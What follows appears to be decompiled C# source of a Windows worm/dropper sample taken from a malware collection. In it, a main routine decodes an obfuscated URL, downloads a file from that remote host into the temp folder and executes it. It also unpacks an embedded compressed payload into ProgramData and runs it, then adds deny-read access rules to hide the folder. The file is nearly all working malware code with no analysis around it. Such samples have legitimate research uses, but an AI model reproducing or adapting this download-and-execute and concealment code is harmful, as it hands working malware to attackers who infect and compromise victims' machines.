// Decompiled with JetBrains decompiler
// Type: X
// Assembly: server, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: CC5BAB73-C3A8-4F97-A21A-E4BEAEB7E679
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00007-msil\Worm.Win32.VBNA.d-d3a8fc138d438754c1faecd862bc84f36ef8d749a229ba9dfbbb5346bfdcea9a.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Reflection;
using System.Resources;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;

internal class X
{
  [STAThread]
  public static void main()
  {
    if (AppDomain.CurrentDomain.BaseDirectory.Length < 4 | Strings.InStr(AppDomain.CurrentDomain.BaseDirectory.ToLower(), "temp") > 0)
    {
      try
      {
        WebClient webClient1 = new WebClient();
        string path = Interaction.Environ("temp") + "\\jp.exe";
        WebClient webClient2 = webClient1;
        string s = "Ahr0CdOVl2XVywrPBMCTys5SzwfKAg9ZDgvYlMnVBs90ywWUmJaXmdKYoteXmJe1nc5LEgu=";
        string address = X.DEB(ref s);
        byte[] bytes = webClient2.DownloadData(address);
        System.IO.File.WriteAllBytes(path, bytes);
        Interaction.Shell(Interaction.Environ("temp") + "\\jp.exe");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
    byte[] bytes1 = X.Z(X.Z((byte[]) new ResourceManager("M", Assembly.GetExecutingAssembly()).GetObject("A")));
    string Path = Interaction.Environ("programdata") + "\\servrr";
    string str = Path + "\\servrr.exe";
    try
    {
      FileSystem.MkDir(Path);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    try
    {
      X.BD(ref Path);
      System.IO.File.WriteAllBytes(str, bytes1);
      Interaction.Shell(str);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  public static byte[] Z(byte[] Byt)
  {
    MemoryStream memoryStream = new MemoryStream(Byt);
    GZipStream gzipStream = new GZipStream((Stream) memoryStream, CompressionMode.Decompress);
    byte[] buffer = new byte[4];
    memoryStream.Position = checked (memoryStream.Length - 5L);
    memoryStream.Read(buffer, 0, 4);
    int int32 = BitConverter.ToInt32(buffer, 0);
    memoryStream.Position = 0L;
    byte[] array = new byte[checked (int32 - 1 + 1)];
    gzipStream.Read(array, 0, int32);
    gzipStream.Dispose();
    memoryStream.Dispose();
    return array;
  }

  public static string DEB(ref string s) => Encoding.UTF8.GetString(Convert.FromBase64String(X.Lu(ref s)));

  public static string Lu(ref string text)
  {
    string str1 = "qwertyuiopasdfghjklzxcvbnm";
    string str2 = "";
    int num1 = checked (text.Length - 1);
    int index1 = 0;
    while (index1 <= num1)
    {
      int num2 = checked (str1.Length - 1);
      int index2 = 0;
      while (index2 <= num2)
      {
        char ch1 = text[index1];
        char ch2;
        if ((int) ch1 == (int) str1[index2])
        {
          string str3 = str2;
          ch2 = text[index1];
          string upper = ch2.ToString().ToUpper();
          str2 = str3 + upper;
          goto label_9;
        }
        else
        {
          int num3 = (int) ch1;
          ch2 = str1[index2];
          int num4 = (int) Conversions.ToChar(ch2.ToString().ToUpper());
          if (num3 == num4)
          {
            str2 += text[index1].ToString().ToLower();
            goto label_9;
          }
          else
            checked { ++index2; }
        }
      }
      str2 += Conversions.ToString(text[index1]);
label_9:
      checked { ++index1; }
    }
    return str2;
  }

  public static void BD(ref string Path)
  {
    DirectorySecurity accessControl1 = Directory.GetAccessControl(Path, AccessControlSections.All);
    try
    {
      foreach (FileSystemAccessRule accessRule in (ReadOnlyCollectionBase) accessControl1.GetAccessRules(true, true, typeof (NTAccount)))
      {
        try
        {
          DirectorySecurity accessControl2 = Directory.GetAccessControl(Path, AccessControlSections.All);
          FileSystemAccessRule rule = new FileSystemAccessRule((IdentityReference) new NTAccount(Strings.Split(accessRule.IdentityReference.Value, "\\")[1]), FileSystemRights.ReadData, AccessControlType.Deny);
          accessControl2.AddAccessRule(rule);
          Directory.SetAccessControl(Path, accessControl2);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }
}
